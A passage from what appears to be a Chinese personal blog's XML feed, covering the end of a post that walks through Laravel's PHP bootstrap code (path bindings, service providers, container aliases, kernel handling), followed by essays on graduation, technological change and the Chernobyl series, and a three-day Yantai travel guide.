项目根目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.lang'</span>, <span class="keyword">$this</span>-&gt;langPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.config'</span>, <span class="keyword">$this</span>-&gt;configPath());        <span class="comment">//config_path()     config 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.public'</span>, <span class="keyword">$this</span>-&gt;publicPath());        <span class="comment">//public_path()     public 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.storage'</span>, <span class="keyword">$this</span>-&gt;storagePath());      <span class="comment">//storage_path()    storage 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.database'</span>, <span class="keyword">$this</span>-&gt;databasePath());    <span class="comment">//database_path()   database 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.resources'</span>, <span class="keyword">$this</span>-&gt;resourcePath());   <span class="comment">//resource_path()   resource 目录的绝对路径</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.bootstrap'</span>, <span class="keyword">$this</span>-&gt;bootstrapPath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-2-注册基础绑定"><a href="#2-1-2-注册基础绑定" class="headerlink" title="2.1.2 注册基础绑定"></a>2.1.2 注册基础绑定</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseBindings</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::setInstance(<span class="keyword">$this</span>);                                             <span class="comment">//实例化 Application</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'app'</span>, <span class="keyword">$this</span>);                                          <span class="comment">//将 Application 注册到容器中 ???</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(Container::class, <span class="keyword">$this</span>);                               <span class="comment">//将 ???</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;singleton(Mix::class);                                           <span class="comment">//实例化 Mix 类 ???</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(PackageManifest::class, <span class="keyword">new</span> PackageManifest(            <span class="comment">//将文件路径注册到容器中 ???</span></span><br><span class="line">        <span class="keyword">new</span> Filesystem, <span class="keyword">$this</span>-&gt;basePath(), <span class="keyword">$this</span>-&gt;getCachedPackagesPath()</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-3-注册基础服务提供者"><a href="#2-1-3-注册基础服务提供者" class="headerlink" title="2.1.3 注册基础服务提供者"></a>2.1.3 注册基础服务提供者</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseServiceProviders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> EventServiceProvider(<span class="keyword">$this</span>));       <span class="comment">//注册事件服务提供者</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> LogServiceProvider(<span class="keyword">$this</span>));         <span class="comment">//注册日志服务提供者</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> RoutingServiceProvider(<span class="keyword">$this</span>));     <span class="comment">//注册路由服务提供者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-4-注册内核容器别名"><a href="#2-1-4-注册内核容器别名" class="headerlink" title="2.1.4 注册内核容器别名"></a>2.1.4 注册内核容器别名</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerCoreContainerAliases</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ([</span><br><span class="line">        <span class="string">'app'</span>                  =&gt; [\Illuminate\Foundation\Application::class, \Illuminate\Contracts\Container\Container::class, \Illuminate\Contracts\Foundation\Application::class,  \Psr\Container\ContainerInterface::class],</span><br><span class="line">        <span class="string">'auth'</span>                 =&gt; [\Illuminate\Auth\AuthManager::class, \Illuminate\Contracts\Auth\Factory::class],</span><br><span class="line">        <span class="string">'auth.driver'</span>          =&gt; [\Illuminate\Contracts\Auth\Guard::class],</span><br><span class="line">        <span class="string">'blade.compiler'</span>       =&gt; [\Illuminate\View\Compilers\BladeCompiler::class],</span><br><span class="line">        <span class="string">'cache'</span>                =&gt; [\Illuminate\Cache\CacheManager::class, \Illuminate\Contracts\Cache\Factory::class],</span><br><span class="line">        <span class="string">'cache.store'</span>          =&gt; [\Illuminate\Cache\Repository::class, \Illuminate\Contracts\Cache\Repository::class],</span><br><span class="line">        <span class="string">'config'</span>               =&gt; [\Illuminate\Config\Repository::class, \Illuminate\Contracts\Config\Repository::class],</span><br><span class="line">        <span class="string">'cookie'</span>               =&gt; [\Illuminate\Cookie\CookieJar::class, \Illuminate\Contracts\Cookie\Factory::class, \Illuminate\Contracts\Cookie\QueueingFactory::class],</span><br><span class="line">        <span class="string">'encrypter'</span>            =&gt; [\Illuminate\Encryption\Encrypter::class, \Illuminate\Contracts\Encryption\Encrypter::class],</span><br><span class="line">        <span class="string">'db'</span>                   =&gt; [\Illuminate\Database\DatabaseManager::class],</span><br><span class="line">        <span class="string">'db.connection'</span>        =&gt; [\Illuminate\Database\Connection::class, \Illuminate\Database\ConnectionInterface::class],</span><br><span class="line">        <span class="string">'events'</span>               =&gt; [\Illuminate\Events\Dispatcher::class, \Illuminate\Contracts\Events\Dispatcher::class],</span><br><span class="line">        <span class="string">'files'</span>                =&gt; [\Illuminate\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem'</span>           =&gt; [\Illuminate\Filesystem\FilesystemManager::class, \Illuminate\Contracts\Filesystem\Factory::class],</span><br><span class="line">        <span class="string">'filesystem.disk'</span>      =&gt; [\Illuminate\Contracts\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem.cloud'</span>     =&gt; [\Illuminate\Contracts\Filesystem\Cloud::class],</span><br><span class="line">        <span class="string">'hash'</span>                 =&gt; [\Illuminate\Hashing\HashManager::class],</span><br><span class="line">        <span class="string">'hash.driver'</span>          =&gt; [\Illuminate\Contracts\Hashing\Hasher::class],</span><br><span class="line">        <span class="string">'translator'</span>           =&gt; [\Illuminate\Translation\Translator::class, \Illuminate\Contracts\Translation\Translator::class],</span><br><span class="line">        <span class="string">'log'</span>                  =&gt; [\Illuminate\Log\LogManager::class, \Psr\Log\LoggerInterface::class],</span><br><span class="line">        <span class="string">'mailer'</span>               =&gt; [\Illuminate\Mail\Mailer::class, \Illuminate\Contracts\Mail\Mailer::class, \Illuminate\Contracts\Mail\MailQueue::class],</span><br><span class="line">        <span class="string">'auth.password'</span>        =&gt; [\Illuminate\Auth\Passwords\PasswordBrokerManager::class, \Illuminate\Contracts\Auth\PasswordBrokerFactory::class],</span><br><span class="line">        <span class="string">'auth.password.broker'</span> =&gt; [\Illuminate\Auth\Passwords\PasswordBroker::class, \Illuminate\Contracts\Auth\PasswordBroker::class],</span><br><span class="line">        <span class="string">'queue'</span>                =&gt; [\Illuminate\Queue\QueueManager::class, \Illuminate\Contracts\Queue\Factory::class, \Illuminate\Contracts\Queue\Monitor::class],</span><br><span class="line">        <span class="string">'queue.connection'</span>     =&gt; [\Illuminate\Contracts\Queue\Queue::class],</span><br><span class="line">        <span class="string">'queue.failer'</span>         =&gt; [\Illuminate\Queue\Failed\FailedJobProviderInterface::class],</span><br><span class="line">        <span class="string">'redirect'</span>             =&gt; [\Illuminate\Routing\Redirector::class],</span><br><span class="line">        <span class="string">'redis'</span>                =&gt; [\Illuminate\Redis\RedisManager::class, \Illuminate\Contracts\Redis\Factory::class],</span><br><span class="line">        <span class="string">'request'</span>              =&gt; [\Illuminate\Http\Request::class, \Symfony\Component\HttpFoundation\Request::class],</span><br><span class="line">        <span class="string">'router'</span>               =&gt; [\Illuminate\Routing\Router::class, \Illuminate\Contracts\Routing\Registrar::class, \Illuminate\Contracts\Routing\BindingRegistrar::class],</span><br><span class="line">        <span class="string">'session'</span>              =&gt; [\Illuminate\Session\SessionManager::class],</span><br><span class="line">        <span class="string">'session.store'</span>        =&gt; [\Illuminate\Session\Store::class, \Illuminate\Contracts\Session\Session::class],</span><br><span class="line">        <span class="string">'url'</span>                  =&gt; [\Illuminate\Routing\UrlGenerator::class, \Illuminate\Contracts\Routing\UrlGenerator::class],</span><br><span class="line">        <span class="string">'validator'</span>            =&gt; [\Illuminate\Validation\Factory::class, \Illuminate\Contracts\Validation\Factory::class],</span><br><span class="line">        <span class="string">'view'</span>                 =&gt; [\Illuminate\View\Factory::class, \Illuminate\Contracts\View\Factory::class],</span><br><span class="line">    ] <span class="keyword">as</span> $key =&gt; $aliases) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($aliases <span class="keyword">as</span> $alias) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;alias($key, $alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-内核绑定"><a href="#2-2-内核绑定" class="headerlink" title="2.2 内核绑定"></a>2.2 内核绑定</h4><p>接下来，我们需要绑定一些重要接口到容器中，以使我们在需要时能够从容器中解析。内核服务可以处理来自 web 与 cli 的请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Http\Kernel::class,</span><br><span class="line">    App\Http\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Console\Kernel::class,</span><br><span class="line">    App\Console\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Debug\ExceptionHandler::class,</span><br><span class="line">    App\Exceptions\Handler::class</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="3-从容器中解析-Kernel"><a href="#3-从容器中解析-Kernel" class="headerlink" title="3. 从容器中解析 Kernel"></a>3. 从容器中解析 Kernel</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br></pre></td></tr></table></figure><h3 id="4-接收请求并处理"><a href="#4-接收请求并处理" class="headerlink" title="4. 接收请求并处理"></a>4. 接收请求并处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="5-响应请求"><a href="#5-响应请求" class="headerlink" title="5. 响应请求"></a>5. 响应请求</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$response-&gt;send();</span><br></pre></td></tr></table></figure><h4 id="6-终止程序"><a href="#6-终止程序" class="headerlink" title="6. 终止程序"></a>6. 终止程序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><hr><p><em>未完待续……</em></p>]]></content>
      
      
      <categories>
          
          <category> 软件编程，PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写在毕业季</title>
      <link href="/post/graduation/"/>
      <url>/post/graduation/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g48hfo0bj8j30zk0nnwif.jpg" alt=""></p><p>四年前的今天，我离开了学校。</p><a id="more"></a><p>还记得小学毕业时，有很多无话不谈的玩伴，如今却在寒暄之后突然安静；初中毕业时，很多同学都在同学录上的梦想一栏写下了「环游世界」，不知道他们现在是否还记得；高中毕业时，很多同学写道「有事没事常联系」，但很多人已经在列表沉寂多年；大学毕业时，酒桌上觥筹交错，有人酒后诉说着离别之殇，有人走出饭馆便吐了一地，有人忙碌的照顾着大家……望着他们相扶着摇摇晃晃走进校园的背影，你不禁会想：当明天的太阳升起时，各自开始收拾自己的行囊，踏上未所知的前路……</p><p>在岁月流转间，早已模糊了少年。那时所奢望的金钱，却忽略了自己所拥有最宝贵的财富——时间。在日复一日的迷茫中，终日无所事事，在不知不觉间就走到了 2015 年的夏天。那个夏天与往年并没有什么不同，只是当年所羡慕的毕业照主角变成了自己。随着离校日期的临近，各种各样的饭局随之而来，我记得当时还在调侃说“这散伙饭都吃了一个月还没散伙”。在学校最后的日子里，428 宿舍没日没夜的麻将，430 凌晨还在 DOTA 中奋战……这些声音犹在耳畔，但模样却已渐渐模糊。</p><p>到了拍毕业照那天，我们班在校门口拍了一张堪称海报的毕业集体照，之后的自由拍照时间便是我拙劣的 PS 大显神通的时候了。</p><p>离校那天，虽然我家距离学校只有一小时车程，但我因无法承受空荡荡的宿舍所带来的离别之情而第一个离开。彼时的我可能想过此去经年，却未曾感受过物是人非、相见无言。</p><p>虽然科技的发展让沟通更加的便捷，但并没有让我的联系人列表更加地活跃；虽然发达的交通让我们一日千里，但我可能会点个外卖，在抖音中一窥我未曾到过的地方。在被生活裹挟着的波涛中，可能是时候放下手机，走出家门，会会老友，看看世界。</p><p>还记得在毕业时的自我评价上写道“虽然今天走出了校园，但我刚刚踏入了社会这所大学，还有很多东西需要不断地学习。人可以不上学，但不可以不学习。”。毕业的这些年，走过低谷，走过平淡，走过欣喜，也走过迷茫，好在无论什么样的日子，最后都挺了过来，<br>庆幸自己仍不忘初心，没有被时间和现实所打败。感谢 3 年前那个刚过完 24 岁生日的少年，在众人的反对声中，毅然踏上开往北京的火车，因为他明白：可怕的不是有想法，而是不再有想法。</p><p>在安逸的生活中，会让人丧失斗志，将宝贵的时间消磨在抖音的欢笑中，明星的绯闻中以及在沉迷之后的空虚迷茫中。当你觉得最好的时候，可能是你最坏的时候：你的斗志开始麻痹，眼前的繁荣开始蒙蔽双眼；当你觉得最坏的时候，可能是你最好的时候，因为你已经意识到了问题，并开始着力改正。居安思危，高瞻远瞩，方能决胜未来。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变</title>
      <link href="/post/change/"/>
      <url>/post/change/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g43xynalhaj30kf0b4dil.jpg" alt=""></p><p>今天看到中国政务平台服务在微信和支付宝都上线了，还有很多地方的服务名取的都很文雅，颇有一些感触，故作此文。</p><a id="more"></a><p>信息革命将许多线下活动搬到了线上，消灭了许多低效重复的工作。小时候觉得，课本上写的“足不出户，尽知天下事”离我们还很远，但如今，我们却早已习惯，似乎认为这个世界本来就是这样。</p><p>信息革命不仅带来了便捷，也带来了更大的贫富差距。新技术的不断涌现取代了大量的重复劳动，不断提升就业门槛，让那些小学初中毕业的人随着年龄的增长越来越难以就业，随着 AI 的到来，将会有更多的职业将会被机器所取代。</p><p>在洪水般的资讯与杂讯间，怎样才能高效获取到资讯？你是一年过了 365 天，还是过了 1 天重复了 364 天？随着移动互联网的普及，越来越多的人放下报纸和图书，拿起手机进入直播间。而那些知道自己要去往何方并吧不为途中花香所动的人，终将主宰这个世界。</p><p>在人类历史的长河中，过去的数万年都在平缓的发展，在工业革命之后，人类进入爆炸式增长的时代，而且增长速度越来越快，谁能高瞻远瞩，谁就能在未来掌控话语权。</p><p>5G 大战一触即发，下一个十年，会比过去的十年变化更为剧烈。一日千里即将到来，历史会无情地将那些狂妄自大的人抛弃，唯有变革，才能占领未来高地。</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43xl49hg6j30u01qrac7.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>切尔诺贝利</title>
      <link href="/post/chernobyl/"/>
      <url>/post/chernobyl/</url>
      
        <content type="html"><![CDATA[<p><img src="https://pic4.zhimg.com/v2-d83325c04c1aa47d115a9919e1d96c5e_1200x500.jpg" alt=""></p><blockquote><p>What is the cost of lies?</p><a id="more"></a><p>It’s not that we’ll mistake them for the truth.</p><p>The real danger is that if we hear enough lies, then we no longer recognize the truth at all.</p><p>What can we do then?</p><p>What else is left but to abandon even the hope of truth and content ourselves instead with stories?</p></blockquote><p>当你要被爆头时，真相还重要吗？</p><p>在谎言与真相之间，那些勇敢站出来的勇士，用生命为黑暗送来一束阳光，不懈的坚持最终拯救了数万人的生命。</p><p>谎言可以麻痹，真相不会消失。总有一天，灾难会带来所有真相送来的礼物。</p><p>在灾难面前，我是否能像消防员、水夫、矿工、列加索夫、谢尔比纳一样冲锋陷阵，勇敢站出来说出真相？我不知道。只是从内心由衷的敬佩他们。</p><p>历史不会远去，历史每天都在上演。如果不是苏联倒台，这件事中无数的英雄都将被埋没，那些罪魁祸首也会飘散在历史的风中，而真相则逐渐被人们所遗忘……</p><p>你所了解的，只是他们想让你了解的。</p>]]></content>
      
      
      <categories>
          
          <category> 影像志 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一城一味·烟台</title>
      <link href="/post/yantai/"/>
      <url>/post/yantai/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wri08odj314q0u01cs.jpg" alt=""></p><p>去过他人太多去过的远方，此刻只愿撷取他人未曾到过的宁静之隅。</p><a id="more"></a><p>烟台，一座海滨城市，虽久闻大名，但一提到看海，脑海中首先浮现还是青岛，大连等，提起烟台，似乎没有太多如雷贯耳的风景。但老家是烟台的同事极力推荐，正好端午节也可以出去放松一下，免得在家维护世界和平。说走就走，提前半个月已经抢不到火车票，只好转而购买汽车票，然后开始规划行程。6 月 6 日下午，高考前夕我踏上了烟台之旅。</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wjw5ne7j30u01901kg.jpg" alt="Sunshine 100"></p><p>我所预定的客栈在阳光 100，距离火车站和汽车站步行路程差不多都在十分钟。<br>烟台公交可均可刷微信、支付宝乘车码<br>烟台景点的优惠票都是在检票口验明证件。</p><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>上午可以视情况休息或者出去游玩。烟台市区内的烟台山、各国使馆遗址、滨海景区均有不错的风景。而且均相距不远。</p><h3 id="使馆遗址"><a href="#使馆遗址" class="headerlink" title="使馆遗址"></a>使馆遗址</h3><p>票价：免费<br>从 1862 年英法在烟台建立了使馆后，先后共有 17 个国家建立了使馆，不同风格的使馆也是一大看点。</p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wow5e8aj31900u0b2a.jpg" alt=""></p><h3 id="烟台山"><a href="#烟台山" class="headerlink" title="烟台山"></a>烟台山</h3><p>票价：免费<br>从客栈到烟台山步行距离 2 公里左右。除了登烟台山灯塔需要 10 元外，整个公园内没有其他门票项目。不过推荐在灯塔眺望周围海景与烟台市区，这个价格绝得值得。</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wlmtimjj31900u0qv5.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wpj9n65j31900u0u0x.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wsipuawj31400u04qs.jpg" alt=""></p><h3 id="滨海景区"><a href="#滨海景区" class="headerlink" title="滨海景区"></a>滨海景区</h3><p>票价：免费<br>海风拂动发梢、海浪亲吻着脚丫、儿童们堆着沙滩城堡、还有一群年轻人在广场练习着滑板……如此惬意的午后阳光，多么希望时光就此凝结……</p><p>如果晚上还有精力，可以继续看下夜景。由于我早上 4 点半到了后就没有休息，晚上实在太累了，没能看到夜景，一大遗憾啊。</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wm52jcoj31900u0npd.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wmcv8yuj31900u0qv5.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wmlxsp5j31900u0kjl.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wlbsf05j316a0u0thg.jpg" alt="City on Bubble"></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wmvcgzyj30u01404ls.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43woomamyj30u0190k4v.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wp8cgm6j31900u0kjl.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wx12qdlj31900u0b29.jpg" alt=""></p><h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>提前购买烟台到蓬莱与返程的动车，单程票价 20 元，行程半小时。</p><h3 id="蓬莱阁"><a href="#蓬莱阁" class="headerlink" title="蓬莱阁"></a>蓬莱阁</h3><p>票价：120 元/人，优惠价半价<br>线路：火车站 3、7 路均可直达<br>快艇：50 元/人<br>游艇：200 元/人<br>6 点半左右抵达蓬莱站，随后乘坐 3、7 路公交到达蓬莱阁（大约 1 小时），吃过早饭后前往购票。<br>首先进入的是龙王宫、天后宫等古刹群，游玩完毕后可通过西门到达蓬莱冰宫、横山广场、灯塔、黄渤海分界线等景区，在金龟探海处可乘坐游艇前往八仙过海，游艇上可以投喂海鸥，也是一大乐趣。</p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wpylyyxj31900u0e82.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wq3b4ujj31900u0x6p.jpg" alt=""></p><h3 id="八仙过海"><a href="#八仙过海" class="headerlink" title="八仙过海"></a>八仙过海</h3><p>票价：80 元/人，优惠 70 元/人<br>八仙过海主要就是了解下八仙过海的故事，整个景区为葫芦的形状，我们游艇登陆的是景区的后门，所以不太感兴趣的话可以选择一侧从前门出去，比较节约时间。<br>该景区内可以登会仙阁眺望整个景区和海景，时而会有一群海鸥从眼前略过，风景还蛮不错的。</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wqjg9mwj31900u0e81.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wqqedzbj30u0190npd.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wr2jiluj31400u0e81.jpg" alt=""></p><p>在蓬莱阁、八仙过海、三仙山任一景点购买别处景点门票可凭门票免费乘坐观光车抵达。我们在八仙过海购买了极地海洋世界的门票。此时时间 11 点多，我们就在周边的沙滩玩了一会儿，又吃过午饭后，1 点钟到达海洋馆。</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wrc000vj31400u04da.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wri08odj314q0u01cs.jpg" alt=""></p><h3 id="极地海洋世界"><a href="#极地海洋世界" class="headerlink" title="极地海洋世界"></a>极地海洋世界</h3><p>票价：150 元/人，优惠 130 元/人</p><p>海洋馆中有各色金鱼、鲨鱼、乌龟、水母等，看得眼花缭乱，这种动物都有自己生存的拿手本领：电鳗的瞬时电压可达 240V+，吸盘鱼通过吸附其它大型鱼类或小船搭顺风车来节省自己的体力……还有焦躁不安的北极熊，貌似正处在发情期的海狮等，都留下了很深刻的印象，不得不感叹大自然的鬼斧神工，各种生物的生存本领真实八仙过海，各显神通。</p><p>海洋世界中全天定时有美人鱼和海豚、海狮的表演，都还蛮不错的。海豚、海狮表演位于最顶层，看到这里海洋馆之行也就结束了，出口的路线几乎就都是各种商品了。</p><p>从海洋馆出来时才 4 点半，出门右转 200 米就有 3  路公交车，可以直达火车站候车休息返程了。如果晚上回去精力还不错，还可以在烟台市区看看夜景 :-)</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wrw8x35j31900u0e82.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43ws4iv9kj31900u0u0x.jpg" alt=""></p><h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h2><h3 id="养马岛"><a href="#养马岛" class="headerlink" title="养马岛"></a>养马岛</h3><p>票价：免费<br>养马岛为逆时针单行线，推荐自驾，岛中也有共享电动车与自行车可供租赁，但电动车价格可以说是很贵了。</p><p>乘坐游 1 或 61 路转 617 路可以到达养马岛，行程大约 1 小时。在天马广场下车后，可以快速游览一下天马广场，然后直行 2 公里左右到靠近黄海的海岸线，这里的水真的是清澈见底，有的地方石头是褐色为主，有的则是黑白相间，还有的海岸一条条的绿色海藻带，非常漂亮。沙滩上还有五颜六色的破碎的贝壳。这里没有太浓的商业气息，仍有渔民养殖海参等海产品，这里的商业带来了交通与食宿的便捷，又没有过多的破坏这里本该有的自然风景，在我去过为数不多的景区中，可以算作是一股清流了。许多景点在越来越浓的商业化运作中变得面目全非，如果你想要了解当地人真实的生活，或许你应该去公园看看广场舞，去博物馆看看这座城市的过往，坐公交车看看普通人的日常，到大学蹭一顿廉价的美味午餐。</p><p>在养马岛吹着海风、翻找着贝壳、嬉戏着清澈的海水，眺望着对面弱音若现的城市，此刻，我真正理解了“流连忘返”这个词，对于这样的美景，只好尽收快门。你不知道下次来是否还会有同样的感受，可能开始收门票了，也可能商业化运作更成熟了，也有可能这里什么都没变，而你站在相同的位置再也没有了相同的感受。想做的事，就现在。</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wszlnalj31900u0hdi.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wugy1ifj31900u0kjm.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wvxefe4j31900u0x6q.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43ww8ba2pj31900u0qv6.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wweq27gj31900u0e81.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wwp4w4ej31900u0hdt.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wxagkcmj31900u07wi.jpg" alt=""></p><h3 id="烟台大学"><a href="#烟台大学" class="headerlink" title="烟台大学"></a>烟台大学</h3><p>由于养马岛太好玩了，没能来得及去烟大，只好下次再去了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>烟台多年被评为宜居城市果然名不虚传，初来此处便爱上了这里，如果有机会，我会再游烟台。果然最赚钱的方法都写在刑法里，最美的风景不一定在景区内。<br>人类是健忘的，镜头只能记录瞬间的故事，让你记忆深刻的故事，不在镜头中，而在用心所看到你未曾看到的地方。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>三和大神</title>
      <link href="/post/sanhe-job-market/"/>
      <url>/post/sanhe-job-market/</url>
      
